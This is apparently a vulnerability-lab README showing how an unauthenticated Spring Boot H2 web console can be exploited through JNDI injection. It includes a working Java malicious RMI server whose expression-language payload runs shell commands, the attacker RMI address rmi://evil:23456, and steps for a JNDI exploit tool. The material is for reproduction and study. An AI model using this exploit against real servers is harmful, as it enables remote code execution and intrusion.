# H2 Database Web Console Unauthorized Access

[中文版本（Chinese Version）](README.zh-cn.md)

H2 database is a embedded in-memory database in Java. Springboot with h2 database comes with a web management page which has no authentication if you set the following options:

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

This management page supports using JNDI to load the JDBC driver, which can lead to remote code execution via remote class loading.

References:

- <https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e>

## Setup

Start a spring-boot with h2 database and embedded tomcat:

```
docker-compose up -d
```

After started the container, the spring-boot is listening on `http://your-ip:8080`, the management page is `http://your-ip:8080/h2-console/` by default.

## Vulnerability Reproduce

Reference to *[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)*, we should use `org.apache.naming.factory.BeanFactory` and `javax.el.ELProcessor` to launch the external process after Java 8u191:

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServerNew {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

Simply use this tool *[JNDI](https://github.com/JosephTribbianni/JNDI)* to exploit the vulnerability. First, set up the target command to `touch /tmp/success` at `config.properties`:

![](3.png)

Then start the `JNDI-1.0-all.jar`, is will be listening on `0.0.0.0:23456`. fill in the form based on these pieces of information:

![](1.png)

`javax.naming.InitialContext` is the JNDI factory class name, URL `rmi://evil:23456/BypassByEL` is your evil RMI address.

Evil RMI server received the requests:

![](2.png)

`touch /tmp/success` has been execute successfully:

![](4.png)
